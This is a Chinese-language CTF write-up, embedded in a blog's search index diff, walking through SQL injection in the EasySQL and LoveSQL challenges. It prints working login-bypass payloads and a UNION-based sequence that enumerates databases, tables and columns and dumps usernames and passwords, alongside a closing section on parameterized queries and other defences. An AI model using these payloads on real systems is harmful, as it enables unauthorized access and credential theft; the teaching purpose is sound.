@@ -18,4 +18,329 @@
 <p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
 ]]></content>
   </entry>
+  <entry>
+    <title>Web SQL 注入实战：EasySQL 与 LoveSQL 详解</title>
+    <url>//2026/10/22/web-ctf-sql/</url>
+    <content><![CDATA[<div class="note info"><p><strong>阅读说明</strong></p>
+<ul>
+<li><strong>难度</strong>：入门</li>
+<li><strong>前置知识</strong>：HTTP GET 请求、<code>SELECT</code> 基础、浏览器开发者工具（F12）</li>
+<li><strong>环境</strong>：CTF 靶场。文中靶场地址是当时的临时环境，现在多半已失效，请换成自己的靶场或本地环境（如 sqli-labs）。</li>
+<li>本文所有测试仅用于<strong>授权靶场和教学</strong>，请勿对未授权的站点进行任何测试。</li>
+</ul>
+</div>
+
+<h2 id="0-先补一点基础"><a href="#0-先补一点基础" class="headerlink" title="0. 先补一点基础"></a>0. 先补一点基础</h2><h3 id="0-1-SQL-注入是怎么产生的"><a href="#0-1-SQL-注入是怎么产生的" class="headerlink" title="0.1 SQL 注入是怎么产生的"></a>0.1 SQL 注入是怎么产生的</h3><p>很多老系统会把用户输入直接拼进 SQL 字符串，例如下面这种错误写法：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT id, username, password FROM users</span></span><br><span class="line"><span class="string">        WHERE username=&#x27;<span class="subst">$username</span>&#x27; AND password=&#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>如果用户输入 <code>username = &#39; or 1=1#</code>，最终执行的语句就变成了：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> id, username, password <span class="keyword">FROM</span> users</span><br><span class="line"><span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>#<span class="string">&#x27; AND password=&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>1=1</code> 永远为真，<code>#</code> 又把它后面的密码判断注释掉了，于是不输入正确密码也能登录。这就是最经典的<strong>万能密码</strong>。</p>
+<p>一句话理解：<strong>SQL 注入就是让用户输入”越界”，从数据变成 SQL 代码。</strong></p>
+<h3 id="0-2-三个必须记住的符号"><a href="#0-2-三个必须记住的符号" class="headerlink" title="0.2 三个必须记住的符号"></a>0.2 三个必须记住的符号</h3><table>
+<thead>
+<tr>
+<th>符号</th>
+<th>作用</th>
+<th>例子</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>&#39;</code></td>
+<td>闭合原 SQL 中的字符串</td>
+<td><code>1&#39;</code></td>
+</tr>
+<tr>
+<td><code>#</code></td>
+<td>MySQL 注释，注释掉后面的内容</td>
+<td><code>1&#39; or 1=1#</code></td>
+</tr>
+<tr>
+<td><code>or</code> &#x2F; <code>||</code></td>
+<td>逻辑或，只要一边为真结果就为真</td>
+<td><code>1&#39; or 1=1#</code></td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>注释除了 <code>#</code>，还可以用 <code>-- </code>（<strong>两个减号后面必须跟一个空格</strong>）和 <code>/* */</code>。</p>
+</blockquote>
+<h3 id="0-3-字符型还是数字型？"><a href="#0-3-字符型还是数字型？" class="headerlink" title="0.3 字符型还是数字型？"></a>0.3 字符型还是数字型？</h3><p>这是新手最容易卡住的一步。两种情况的闭合方式不同：</p>
+<ul>
+<li><strong>数字型</strong>：<code>WHERE id = $id</code>，输入 <code>1 and 1=1</code> 正常，<code>1 and 1=2</code> 查不到数据。</li>
+<li><strong>字符型</strong>：<code>WHERE username = &#39;$username&#39;</code>，需要先用 <code>&#39;</code> 闭合：<code>1&#39; and &#39;1&#39;=&#39;1</code> 正常，<code>1&#39; and &#39;1&#39;=&#39;2</code> 查不到数据。</li>
+</ul>
+<div class="note warning"><p>只加一个单引号导致报错，只能说明<strong>这个位置存在注入</strong>，不能直接下结论说是数字型还是字符型。真正的判断标准是：<strong>你构造的闭合语句能不能让页面恢复正常</strong>。</p>
+</div>
+
+<h3 id="0-4-记得做-URL-编码"><a href="#0-4-记得做-URL-编码" class="headerlink" title="0.4 记得做 URL 编码"></a>0.4 记得做 URL 编码</h3><p><code>GET</code> 请求的参数在地址栏里传输，特殊字符会被浏览器或服务器解释，所以要编码：</p>
+<table>
+<thead>
+<tr>
+<th>原字符</th>
+<th>URL 编码</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>&#39;</code></td>
+<td><code>%27</code></td>
+<td>不编码可能被截断</td>
+</tr>
+<tr>
+<td><code>|</code></td>
+<td><code>%7C</code></td>
+<td>两个竖线就是 <code>%7C%7C</code></td>
+</tr>
+<tr>
+<td><code>#</code></td>
+<td><code>%23</code></td>
+<td><strong>最容易踩坑</strong>：不编码的话，浏览器会把 <code>#</code> 后面的内容当成页面锚点，根本不会发给服务器</td>
+</tr>
+<tr>
+<td>空格</td>
+<td><code>%20</code> 或 <code>+</code></td>
+<td>需要空格的 payload 要编码</td>
+</tr>
+</tbody></table>
+<p>例如 <code>1&#39;||1#</code> 编码后就是：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">1%27%7C%7C1%23</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="1-极客大挑战-2019-EasySQL"><a href="#1-极客大挑战-2019-EasySQL" class="headerlink" title="1. [极客大挑战 2019] EasySQL"></a>1. [极客大挑战 2019] EasySQL</h2><h3 id="1-1-观察题目"><a href="#1-1-观察题目" class="headerlink" title="1.1 观察题目"></a>1.1 观察题目</h3><p>打开靶场，是一个很朴素的登录框：</p>
+<p><img src="/2026/10/22/web-ctf-sql/01-login-page.png" alt="EasySQL 登录页面"></p>
+<p><em>图 1：登录页面，提示语是”我是 cl4y，是一个 WEB 开发程序员……”</em></p>
+<p>随便输入 <code>1 / 1</code> 登录，可以看到请求直接走 <code>GET</code>，参数都暴露在地址栏里：</p>
+<p><img src="/2026/10/22/web-ctf-sql/02-check-url.png" alt="check.php 的 URL"></p>
+<p><em>图 2：用户名和密码通过 <code>check.php?username=1&amp;password=1</code> 传递</em></p>
+<p>这给了我们两个重要信息：</p>
+<ol>
+<li>参数名是 <code>username</code> 和 <code>password</code>；</li>
+<li>可以直接在地址栏里改 payload，不需要抓包。</li>
+</ol>
+<h3 id="1-2-第一步：确认注入点"><a href="#1-2-第一步：确认注入点" class="headerlink" title="1.2 第一步：确认注入点"></a>1.2 第一步：确认注入点</h3><p>在 <code>username</code> 后面加一个单引号：</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://b7545d1d777fc16949130ff9.http-ctf2.dasctf.com/check.php?username=1%27&amp;password=1</span><br></pre></td></tr></table></figure>
+
+<p>页面直接抛出了 MariaDB 的语法错误：</p>
+<p><img src="/2026/10/22/web-ctf-sql/03-username-quote-error.png" alt="username 加单引号报错"></p>
+<p><em>图 3：单引号被原样带进了 SQL，说明输入没有过滤</em></p>
+<p>对 <code>password</code> 做同样的测试，也会报错：</p>
+<p><img src="/2026/10/22/web-ctf-sql/04-password-quote-error.png" alt="password 加单引号报错"></p>
+<p><em>图 4：<code>password</code> 位置同样可以注入</em></p>
+<p>到这里可以确认：<strong><code>username</code> 和 <code>password</code> 两个位置都存在 SQL 注入</strong>。</p>
+<h3 id="1-3-第二步：构造万能密码"><a href="#1-3-第二步：构造万能密码" class="headerlink" title="1.3 第二步：构造万能密码"></a>1.3 第二步：构造万能密码</h3><p>既然报错说明引号参与了解析，那就把引号闭合掉，再让条件恒为真：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">username = 1&#x27;||1#</span><br><span class="line">password = 任意值（比如 1）</span><br></pre></td></tr></table></figure>
+
+<p>完整 URL（已做编码）：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">基础地址：http://b7545d1d777fc16949130ff9.http-ctf2.dasctf.com/check.php</span><br><span class="line">查询参数：?username=1%27%7C%7C1%23&amp;password=1</span><br></pre></td></tr></table></figure>
+
+<p>拆开看这个 payload：</p>
+<ul>
+<li><code>1&#39;</code>：闭合 <code>username=&#39;</code> 前面的单引号；</li>
+<li><code>||</code>：MySQL 中的逻辑或，等价于 <code>or</code>；</li>
+<li><code>1</code>：恒为真；</li>
+<li><code>#</code>：注释掉后面的 <code>AND password=&#39;...&#39;</code> 和多余的引号。</li>
+</ul>
+<p>后端拼出来的 SQL 大致是：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users</span><br><span class="line"><span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;1&#x27;</span><span class="operator">||</span><span class="number">1</span>#<span class="string">&#x27; AND password=&#x27;</span><span class="number">1</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>因为 <code>&#39;1&#39;||1</code> 为真，数据库返回了第一条用户记录，页面提示 <code>Login Success!</code>，flag 直接显示出来：</p>
+<p><img src="/2026/10/22/web-ctf-sql/05-easysql-flag.png" alt="EasySQL 拿到 flag"></p>
+<p><em>图 5：登录成功，页面回显 flag</em></p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">CTF2&#123;6b435354-1488-4755-992b-aa4d2901ee47&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-4-等价的几种写法"><a href="#1-4-等价的几种写法" class="headerlink" title="1.4 等价的几种写法"></a>1.4 等价的几种写法</h3><p>下面这些 payload 在这道题里都能达到同样效果，可以自己动手对比：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">1&#x27; or 1=1#</span><br><span class="line">1&#x27; or &#x27;1&#x27;=&#x27;1&#x27;#</span><br><span class="line">1&#x27;||1-- -</span><br></pre></td></tr></table></figure>
+
+<div class="note warning"><p><code>--</code> 注释要求后面<strong>必须有一个空格</strong>。在 URL 里写 <code>-- -</code> 时，空格会被编码成 <code>%20</code>，最终是 <code>--%20-</code>。如果直接写 <code>--</code>，MySQL 不会把它当注释。</p>
+</div>
+
+<hr>
+<h2 id="2-极客大挑战-2019-LoveSQL"><a href="#2-极客大挑战-2019-LoveSQL" class="headerlink" title="2. [极客大挑战 2019] LoveSQL"></a>2. [极客大挑战 2019] LoveSQL</h2><h3 id="2-1-同样的入口，先登录进去"><a href="#2-1-同样的入口，先登录进去" class="headerlink" title="2.1 同样的入口，先登录进去"></a>2.1 同样的入口，先登录进去</h3><p>LoveSQL 的登录页和上一题风格一致：</p>
+<p><img src="/2026/10/22/web-ctf-sql/06-lovesql-login.png" alt="LoveSQL 登录页面"></p>
+<p><em>图 6：LoveSQL 登录页</em></p>
+<p>沿用上一题的万能密码 <code>1&#39;||1#</code>：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">基础地址：http://01fc6bfe26018717c5512075.http-ctf2.dasctf.com/check.php</span><br><span class="line">查询参数：?username=1%27%7C%7C1%23&amp;password=1</span><br></pre></td></tr></table></figure>
+
+<p>登录成功，但这次页面没有直接给 flag，只回显了管理员信息：</p>
+<p><img src="/2026/10/22/web-ctf-sql/07-lovesql-admin.png" alt="LoveSQL 登录成功"></p>
+<p><em>图 7：<code>Hello admin! Your password is &#39;3c97440bd844baefe62761d8c840cb3f&#39;</code></em></p>
+<p>那串 32 位字符串是 MD5，不是 flag。页面上方还写着”这次我把它们放在了那个地方”，说明 flag 被藏在了数据库里，需要继续查询。</p>
+<div class="note info"><p><code>Hello admin!</code> 和 <code>Your password is &#39;...&#39;</code> 这两个位置非常关键——它们是页面会<strong>回显</strong>的字段。后面做 <code>UNION SELECT</code> 时，要正好把数据放在这两个位置上。</p>
+</div>
+
+<h3 id="2-2-第二步：数清楚原来查了几列"><a href="#2-2-第二步：数清楚原来查了几列" class="headerlink" title="2.2 第二步：数清楚原来查了几列"></a>2.2 第二步：数清楚原来查了几列</h3><p><code>UNION</code> 要求前后两个查询的<strong>列数完全一致</strong>，所以先确定原查询有几列。</p>
+<p><strong>方法一：<code>ORDER BY</code>（推荐）</strong></p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">1&#x27; order by 3#</span><br><span class="line">1&#x27; order by 4#</span><br></pre></td></tr></table></figure>
+
+<p><code>order by 3</code> 正常、<code>order by 4</code> 报错，说明原查询是 3 列。</p>
+<p><strong>方法二：直接 <code>UNION SELECT</code></strong></p>
+<p>先猜 1 列：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">1&#x27; union select 1#</span><br></pre></td></tr></table></figure>
+
+<p>页面报错：</p>
+<p><img src="/2026/10/22/web-ctf-sql/09-column-count-error.png" alt="列数不一致报错"></p>
+<p><em>图 8：<code>The used SELECT statements have a different number of columns</code></em></p>
+<p>再试 3 列：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">1&#x27; union select 1,2,3#</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/10/22/web-ctf-sql/11-union-echo.png" alt="UNION 3 列成功"></p>
+<p><em>图 9：<code>Hello 2! Your password is &#39;3&#39;</code></em></p>
+<p>页面显示 <code>Hello 2!</code>、<code>Your password is &#39;3&#39;</code>，说明：</p>
+<ul>
+<li>原查询确实是 <strong>3 列</strong>；</li>
+<li>第 1 列不显示；</li>
+<li><strong>第 2 列会显示在 <code>Hello</code> 后面，第 3 列会显示在 <code>Your password is</code> 后面</strong>。</li>
+</ul>
+<p>这两列就是我们的”回显位”，后面的查询把数据放到第 2、3 列即可。</p>
+<div class="note warning"><p>如果 <code>UNION</code> 报的是列数错误，先不要怀疑 payload 写错，优先检查逗号数量和列数是否对应。原查询有 3 列，<code>union select</code> 也必须写 3 个值。</p>
+</div>
+
+<h3 id="2-3-第三步：爆出数据库名"><a href="#2-3-第三步：爆出数据库名" class="headerlink" title="2.3 第三步：爆出数据库名"></a>2.3 第三步：爆出数据库名</h3><p>先看当前数据库叫什么：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">1&#x27; union select 1,database(),3#</span><br></pre></td></tr></table></figure>
+
+<p>如果想把所有数据库都列出来，就查 <code>information_schema.schemata</code>：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">1&#x27; union select 1,group_concat(schema_name),3 from information_schema.schemata#</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/10/22/web-ctf-sql/12-database-names.png" alt="数据库名列表"></p>
+<p><em>图 10：<code>information_schema,performance_schema,test,mysql,geek</code></em></p>
+<p>其中 <code>geek</code> 就是当前业务数据库。<code>information_schema</code> 是 MySQL 自带的”元数据库”，里面存着所有库、表、字段的信息，是我们后续爆表、爆字段的关键。</p>
+<h3 id="2-4-第四步：爆出表名"><a href="#2-4-第四步：爆出表名" class="headerlink" title="2.4 第四步：爆出表名"></a>2.4 第四步：爆出表名</h3><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">1&#x27; union select 1,group_concat(table_name),3</span><br><span class="line">from information_schema.tables</span><br><span class="line">where table_schema=database()#</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/10/22/web-ctf-sql/15-table-names.png" alt="表名列表"></p>
+<p><em>图 11：当前库中有 <code>geekuser</code> 和 <code>l0ve1ysq1</code> 两张表</em></p>
+<p><code>l0ve1ysq1</code> 这个名字明显是出题人留的线索（love + sql），flag 大概率在这张表里。</p>
+<h3 id="2-5-第五步：爆出字段名"><a href="#2-5-第五步：爆出字段名" class="headerlink" title="2.5 第五步：爆出字段名"></a>2.5 第五步：爆出字段名</h3><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">1&#x27; union select 1,group_concat(column_name),3</span><br><span class="line">from information_schema.columns</span><br><span class="line">where table_schema=database() and table_name=&#x27;l0ve1ysq1&#x27;#</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/10/22/web-ctf-sql/13-column-names.png" alt="字段名列表"></p>
+<p><em>图 12：字段为 <code>id,username,password</code></em></p>
+<div class="note info"><p>如果去掉 <code>and table_name=&#39;l0ve1ysq1&#39;</code> 这个条件，会把 <code>geekuser</code> 和 <code>l0ve1ysq1</code> 两张表的字段一起查出来，于是看到 <code>id,username,password,id,username,password</code> 这样重复的结果——这不是报错，只是两张表字段名恰好一样。</p>
+</div>
+
+<h3 id="2-6-第六步：把数据拖出来"><a href="#2-6-第六步：把数据拖出来" class="headerlink" title="2.6 第六步：把数据拖出来"></a>2.6 第六步：把数据拖出来</h3><p>知道了表名和字段名，直接查：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">1&#x27; union select 1,group_concat(username,0x3a,password),3 from l0ve1ysq1#</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/10/22/web-ctf-sql/16-dump-result.png" alt="拖库结果"></p>
+<p><em>图 13：所有用户名和密码被拼成一行显示</em></p>
+<p>这里用到了两个小技巧：</p>
+<ul>
+<li><code>group_concat()</code>：把多行结果合并成一行，避免页面只显示第一条；</li>
+<li><code>0x3a</code>：十六进制形式的冒号 <code>:</code>，用来分隔用户名和密码。直接在单引号里写 <code>&#39;:&#39;</code> 容易和闭合引号打架，用十六进制更省事。</li>
+</ul>
+<p>结果里已经能看到 flag 的尾巴：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">...3984-4c7b-882a-6d9f50b61de1&#125;</span><br></pre></td></tr></table></figure>
+
+<p>由于页面宽度有限，长字符串可能被 CSS 截断。<strong>按 F12 打开开发者工具</strong>，在 Elements 面板查看对应文本，或者直接在 Console 里执行 <code>document.body.innerText</code> 复制完整内容即可。</p>
+<p>完整 flag：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">CTF2&#123;d4518a67-3984-4c7b-882a-6d9f50b61de1&#125;</span><br></pre></td></tr></table></figure>
+
+<div class="note info"><p>如果只想拿 flag，可以更精准一点，直接用条件过滤，避免在一堆数据里找：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">1&#x27; union select 1,username,password from l0ve1ysq1 where password like &#x27;CTF2%&#x27;#</span><br></pre></td></tr></table></figure></div>
+
+<hr>
+<h2 id="3-完整流程速查表"><a href="#3-完整流程速查表" class="headerlink" title="3. 完整流程速查表"></a>3. 完整流程速查表</h2><table>
+<thead>
+<tr>
+<th>步骤</th>
+<th>目的</th>
+<th>示例 payload</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>判断是否有注入</td>
+<td><code>1&#39;</code> 看是否报错</td>
+</tr>
+<tr>
+<td>2</td>
+<td>判断闭合方式</td>
+<td><code>1&#39; and &#39;1&#39;=&#39;1</code> &#x2F; <code>1&#39; and &#39;1&#39;=&#39;2</code></td>
+</tr>
+<tr>
+<td>3</td>
+<td>万能密码登录</td>
+<td>&#96;1’</td>
+</tr>
+<tr>
+<td>4</td>
+<td>确定列数</td>
+<td><code>1&#39; order by 3#</code>；<code>1&#39; union select 1,2,3#</code></td>
+</tr>
+<tr>
+<td>5</td>
+<td>找回收显位</td>
+<td>页面显示的数字就是回显列</td>
+</tr>
+<tr>
+<td>6</td>
+<td>爆数据库</td>
+<td><code>1&#39; union select 1,database(),3#</code></td>
+</tr>
+<tr>
+<td>7</td>
+<td>爆表名</td>
+<td><code>... from information_schema.tables where table_schema=database()#</code></td>
+</tr>
+<tr>
+<td>8</td>
+<td>爆字段名</td>
+<td><code>... from information_schema.columns where table_name=&#39;l0ve1ysq1&#39;#</code></td>
+</tr>
+<tr>
+<td>9</td>
+<td>拖数据</td>
+<td><code>... group_concat(username,0x3a,password) from l0ve1ysq1#</code></td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="4-新手常见问题"><a href="#4-新手常见问题" class="headerlink" title="4. 新手常见问题"></a>4. 新手常见问题</h2><p><strong>Q1：为什么 <code>#</code> 一定要写成 <code>%23</code>？</strong></p>
+<p>浏览器地址栏里 <code>#</code> 表示页面锚点，后面的内容不会发送给服务器。<code>1&#39;||1#</code> 直接写进 URL，服务器只能收到 <code>1&#39;||1</code>，当然失败。用 <code>%23</code> 或者用 Burp Suite、curl 发包都可以避免这个问题。</p>
+<p><strong>Q2：报 <code>different number of columns</code> 怎么办？</strong></p>
+<p><code>UNION</code> 前后列数不一致。先用 <code>order by N</code> 二分确定原查询列数，或者在 <code>union select</code> 后面补&#x2F;删逗号。</p>
+<p><strong>Q3：<code>union select</code> 有结果，但页面不显示？</strong></p>
+<p>说明数据放在了不回显的列（这道题的第 1 列）。把要显示的内容移到第 2 或第 3 列。</p>
+<p><strong>Q4：<code>group_concat</code> 结果被截断了？</strong></p>
+<p>MySQL 的 <code>group_concat_max_len</code> 默认是 1024 字节。可以用 <code>substr()</code> 分段读取：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">1&#x27; union select 1,substr(group_concat(username,0x3a,password),1,1024),3 from l0ve1ysq1#</span><br></pre></td></tr></table></figure>
+
+<p>把 <code>1</code> 改成 <code>1025</code>、<code>2049</code>，继续往后读即可。</p>
+<p><strong>Q5：payload 明明一样，为什么我失败？</strong></p>
+<p>检查这几点：引号是不是中文引号、<code>||</code> 是不是中文全角、<code>#</code> 有没有编码、<code>--</code> 后面有没有空格、<code>union select</code> 的列数对不对。</p>
+<p><strong>Q6：靶场地址打不开了？</strong></p>
+<p>这类在线靶场地址是临时分配的，过期就失效。可以自己在本地搭 sqli-labs，或用其他公开靶场练习，payload 的思路是一样的。</p>
+<hr>
+<h2 id="5-顺手聊聊怎么防"><a href="#5-顺手聊聊怎么防" class="headerlink" title="5. 顺手聊聊怎么防"></a>5. 顺手聊聊怎么防</h2><p>做题是为了理解攻击，写代码时要避免同样的错误：</p>
+<ol>
+<li><strong>使用预编译语句（参数化查询）</strong>，不要拼接字符串：</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(</span><br><span class="line">    <span class="string">&#x27;SELECT id, username FROM users WHERE username = ? AND password = ?&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>([<span class="variable">$username</span>, <span class="variable">$password</span>]);</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li><strong>输入做白名单校验</strong>，比如 id 只允许数字。</li>
+<li><strong>数据库账号最小权限</strong>，Web 账号不要有 <code>FILE</code>、跨库查询等权限。</li>
+<li><strong>不要把数据库报错直接回显给用户</strong>，错误信息会帮助攻击者判断注入类型和列数。</li>
+<li><strong>密码加盐哈希存储</strong>，不要明文或简单 MD5。</li>
+</ol>
+<hr>
+<h2 id="6-总结"><a href="#6-总结" class="headerlink" title="6. 总结"></a>6. 总结</h2><p>这两道题其实是一条完整的学习路径：</p>
+<ul>
+<li><strong>EasySQL</strong> 教会我们：找到注入点 → 闭合引号 → 注释掉密码判断 → 万能密码登录；</li>
+<li><strong>LoveSQL</strong> 教会我们：登录只是开始，真正的数据要靠 <code>UNION SELECT</code> 去查；</li>
+<li>通用套路可以记成一句话：</li>
+</ul>
+<blockquote>
+<p><strong>判注入 → 定列数 → 找回显 → 爆库 → 爆表 → 爆字段 → 拖数据</strong></p>
+</blockquote>
+<p>把这条流程在自己搭的靶场上手动走几遍，比背 payload 有用得多。下一篇可以继续练习盲注、报错注入和时间盲注。</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>SQL 注入</tag>
+        <tag>UNION 注入</tag>
+        <tag>information_schema</tag>
+        <tag>极客大挑战</tag>
+      </tags>
+  </entry>
 </search>
